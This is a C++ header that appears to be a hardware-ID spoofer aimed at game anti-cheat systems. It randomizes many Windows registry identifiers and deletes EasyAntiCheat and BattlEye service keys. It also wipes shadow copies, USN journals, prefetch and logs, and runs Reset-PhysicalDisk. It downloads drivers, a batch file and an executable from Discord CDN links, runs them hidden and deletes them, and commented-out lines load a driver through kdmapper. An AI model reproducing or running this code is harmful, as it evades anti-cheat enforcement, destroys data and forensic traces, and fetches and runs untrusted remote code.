#pragma once
#include <iostream>
#include <windows.h>
#include <urlmon.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#pragma comment(lib, "urlmon.lib")
namespace fs = std::filesystem;  // Make sure you're using the correct filesystem namespace



// Function to download a file from a URL
bool DownloadFile(const char* url, const char* destination) {
	return URLDownloadToFileA(NULL, url, destination, 0, NULL) == S_OK;
}

// Function to execute a file
void ExecuteFile(const char* filePath) {
	ShellExecuteA(NULL, "open", filePath, NULL, NULL, SW_HIDE);
	Sleep(5000);  // Give the process some time to start
}

// Function to securely delete a file
void DeleteFileSecurely(const char* filePath) {
	Sleep(3000); // Wait to ensure execution is completed
	std::remove(filePath);
}

bool StopService(const char* serviceName) {
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager) return false;

	SC_HANDLE hService = OpenServiceA(hSCManager, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
	if (!hService) {
		CloseServiceHandle(hSCManager);
		return false;
	}

	SERVICE_STATUS serviceStatus;
	ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
	Sleep(5000); // Wait for service to stop

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return true;
}

// Function to start a Windows service
bool StartServiceFunc(const char* serviceName) {
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager) return false;

	SC_HANDLE hService = OpenServiceA(hSCManager, serviceName, SERVICE_START);
	if (!hService) {
		CloseServiceHandle(hSCManager);
		return false;
	}

	StartServiceA(hService, 0, NULL);
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return true;
}

// Main spoof function
void spoof1() {
	// File URLs (Replace with actual links)
	const char* sys1_url = "https://cdn.discordapp.com/attachments/1307292522212491314/1338027111398506567/amifldrv64.sys?ex=67a9965a&is=67a844da&hm=1e154f707b0b86f90bbabc0b7e9c28c088533b70f44a75d5160ae104abfafd1d&";
	const char* sys2_url = "https://cdn.discordapp.com/attachments/1307292522212491314/1338027111759478835/amigendrv64.sys?ex=67a9965a&is=67a844da&hm=bf83cecaac6d9fb3811d0307851346d891088dc1a4cf52e68593c1c0ca340605&";
	const char* batch_url = "https://cdn.discordapp.com/attachments/1307292522212491314/1338027084269879428/AmiSpoof.bat?ex=67a99654&is=67a844d4&hm=90d1c2c9afb08bdd7ab88339acd986e98579a1ea9ef155e831feb0526806b363&";
	const char* exe_url = "https://cdn.discordapp.com/attachments/1307292522212491314/1338027111058772038/AMIDEWINx64.EXE?ex=67a9965a&is=67a844da&hm=601e12e4da4426ee31ee9a6a6abb237c9399ade781097cfa6467c3feb382e3a7&";
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t reg_SZ /d %random% /f >nul");
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName /v ComputerName /t reg_SZ /d %random% /f >nul");
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul");
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareIds /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\SQMClient /v WinSqmFirstSessionStartTime /t reg_QWORD /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t reg_QWORD /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t reg_QWORD /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography /v GUID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v ClientUUID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v PersistenceIdentifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global\\CoProcManager /v ChipsetMatchID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"0\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"1\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul");
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\System\\CurrentControlSet\\Control\\DevQuery\\6 /v UUID /t reg_SZ /d%random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v NV\" \"Hostname /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul");
	system("reg add HKLM\\SYSTEM\\Software\\Microsoft /v BuildLab /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SYSTEM\\Software\\Microsoft /v BuildLabEx /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v AccountDomainSid /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v PingID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Tracing\\Microsoft\\Profile\\Profile /v Guid /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v registeredOwner /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v registeredOrganization /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildBranch /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId /t reg_BINARY /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId4 /t reg_BINARY /d %random%%random%-%random%%random%-%random%%random% /f");
	system("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\kbdclass\\Parameters /v WppRecorder_TraceGuid /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f");
	system("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\mouhid\\Parameters /v WppRecorder_TraceGuid /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f");
	system("reg DELETE HKLM\\SYSTEM\\MountedDevices /f");
	system("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f");
	system("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f");
	system("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\Volume\\Computer /f");
	system("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f");
	system("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\Volume\\Computer\\CPC /f");
	system("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\Volume\\Computer\\CPC\\Volume /f");
	system("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\Volume\\Computer\\CPC\\Volume\\Computer /f");
	system("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f");
	system("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f");
	system("reg DELETE HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f");
	system("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v AcpiData /f");
	system("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v BiosData /f");
	system("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v registersData /f");
	system("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v SMBiosData /f");
	system("reg DELETE HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /f");
	system("reg DELETE HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f");
	system("reg DELETE HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f");
	system("net start winmgmt /y >nul");
	system("ipconfig /flushdns >nul");
	system("netsh int reset all >nul");
	system("netsh int ipv4 reset >nul");
	system("netsh int ipv6 reset >nul");
	system("netsh winsock reset >nul");
	system("powershell vssadmin delete shadows /all >nul");
	system("powershell Reset-PhysicalDisk * >nul");
	system("fsutil usn deletejournal /n C: >nul");
	system("fsutil usn deletejournal /n D: >nul");
	system("fsutil usn deletejournal /n E: >nul");
	system("fsutil usn deletejournal /n F: >nul");
	system("del /s /f /q C:\\Windows\\System32\\restore\\MachineGuid.txt >nul");
	system("del /s /f /q C:\\System Volume Information\\IndexerVolumeGuid >nul");
	system("del /s /f /q C:\\System Volume Information\\tracking.log >nul");
	system("del /s /f /q C:\\Windows\\INF\\setupapi.dev.log >nul");
	system("del /s /f /q C:\\Windows\\INF\\setupapi.setup.log >nul");
	system("rmdir /s /q C:\\Windows\\temp >nul");
	system("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Temp >nul");
	system("rmdir /s /q C:\\Windows\\Prefetch >nul");


	//system("curl --silent https://file.garden/ZoL8cfreXgpHHpis/Mapper.bin --output C:\\Windows\\System32\\mapper.exe >nul");
	//system("curl https://cdn.discordapp.com/attachments/1307292522212491314/1335722696532824207/Driver.sys?ex=67a91d33&is=67a7cbb3&hm=60db5b50ee3ed4a1f6c1027fa4547fe4e7e976c1874b5a6d94ed2756d84ee5a3& -o C:\\Windows\\System32\\null.sys --silent");
	//system("C:\\Windows\\System32\\kdmapper.exe C:\\Windows\\System32\\Driver.sys --silent");

	// Local paths
	const char* sys1_path = "C:\\Windows\\Temp\\amifldrv64.sys";
	const char* sys2_path = "C:\\Windows\\Temp\\amigendrv64.sys";
	const char* batch_path = "C:\\Windows\\Temp\\AmiSpoof.bat";
	const char* exe_path = "C:\\Windows\\Temp\\AMIDEWINx64.EXE";

	// Download files
	if (DownloadFile(sys1_url, sys1_path)) std::cout << "[+] mapping driver: 1\n";
	if (DownloadFile(sys2_url, sys2_path)) std::cout << "[+] mapping driver: 2\n";
	if (DownloadFile(batch_url, batch_path)) std::cout << "[+] executing spoof\n";
	if (DownloadFile(exe_url, exe_path)) std::cout << "[+] successfully spoofed\n";

	// Execute batch file (for installing/uninstalling drivers)
	ExecuteFile(batch_path);

	// Execute the EXE tool
	ExecuteFile(exe_path);

	// Delete the files after execution

	system("del C:\\Windows\\Temp\\amifldrv64.sys");
	system("del C:\\Windows\\Temp\\amigendrv64.sys");
	system("del C:\\Windows\\Temp\\AmiSpoof.bat");
	system("del C:\\Windows\\Temp\\AMIDEWINx64.EXE");

	std::cout << "[+] Files deleted after execution.\n";

	if (StopService("Winmgmt")) {
		std::cout << "[+] WMI service stopped successfully.\n";
	}
	else {
		std::cout << "[!] Failed to stop WMI service.\n";
	}

	// Start WMI service
	if (StartServiceFunc("Winmgmt")) {
		std::cout << "[+] WMI service restarted successfully.\n";
	}
	else {
		std::cout << "[!] Failed to start WMI service.\n";
	}
}

// Main spoof function
bool spoof13() {
	bool success13 = true; // Flag to track overall success

	// Define file path
	const char* filePath = "C:\\Windows\\Temp\\AmiSpoof.bat";

	// Download AmiSpoof.bat
	if (system(("curl -s -o " + std::string(filePath) +
		" https://cdn.discordapp.com/attachments/1307292522212491314/1338027084269879428/AmiSpoof.bat?ex=67ace214&is=67ab9094&hm=547ba7bcec345f5eb65c791b35abbfc800185cf210497a2bcc285365720593ab").c_str()) != 0) {
		success13 = false;
	}

	// Check if file exists before executing
	std::ifstream file(filePath);
	if (!file.good()) {
		success13 = false;
	}
	else {
		file.close();

		// Execute AmiSpoof.bat
		if (system(filePath) != 0) {
			success13 = false;
		}

		// Delete AmiSpoof.bat
		if (system(("del " + std::string(filePath)).c_str()) != 0) {
			success13 = false;
		}
	}

	return success13;
}


bool macspoof() {
	bool success = true; // Flag to track overall success

	// Download the batch file
	const char* batchFilePath = "C:\\Users\\YourUsername\\Downloads\\AmiSpoof.bat"; // Change path to your Downloads folder or desired location

	// Command to download the batch file using curl
	std::string downloadCommand = "curl -s -o " + std::string(batchFilePath) + " https://cdn.discordapp.com/attachments/1307292522212491314/1338027084269879428/AmiSpoof.bat?ex=67ace214&is=67ab9094&hm=547ba7bcec345f5eb65c791b35abbfc800185cf210497a2bcc285365720593ab";

	if (system(downloadCommand.c_str()) != 0) {
		success = false; // If download fails, set success to false
	}

	// Check if the file exists
	std::ifstream file(batchFilePath);
	if (!file.good()) {
		success = false; // If file doesn't exist, set success to false
	}
	else {
		file.close();

		// Execute the batch file
		if (system(batchFilePath) != 0) {
			success = false; // If execution fails, set success to false
		}

		// Delete the batch file after execution
		std::string deleteCommand = "del " + std::string(batchFilePath);
		system(deleteCommand.c_str());
	}

	return success;
}

// Function to handle download, execution, and deletion (no return value)
void macspoofVoid() {
	const char* batchFilePath = "C:\\Windows\\Temp\\AmiSpoof.bat"; // Change path to your Downloads folder or desired location

	// Download the batch file
	if (system(("curl -s -o " + std::string(batchFilePath) + " https://cdn.discordapp.com/attachments/1307292522212491314/1338027084269879428/AmiSpoof.bat?ex=67ace214&is=67ab9094&hm=547ba7bcec345f5eb65c791b35abbfc800185cf210497a2bcc285365720593ab").c_str()) != 0) {
		std::cout << "Download failed!" << std::endl;
		return; // Exit if download fails
	}

	// Check if the file exists
	std::ifstream file(batchFilePath);
	if (!file.good()) {
		std::cout << "File not found!" << std::endl;
		return; // Exit if file doesn't exist
	}
	else {
		file.close();

		// Execute the batch file
		if (system(batchFilePath) != 0) {
			std::cout << "Execution failed!" << std::endl;
			return; // Exit if execution fails
		}

		// Delete the batch file after execution
		if (system(("del " + std::string(batchFilePath)).c_str()) != 0) {
			std::cout << "Failed to delete the batch file!" << std::endl;
		}
	}

	std::cout << "MAC Spoof completed successfully!" << std::endl;
}

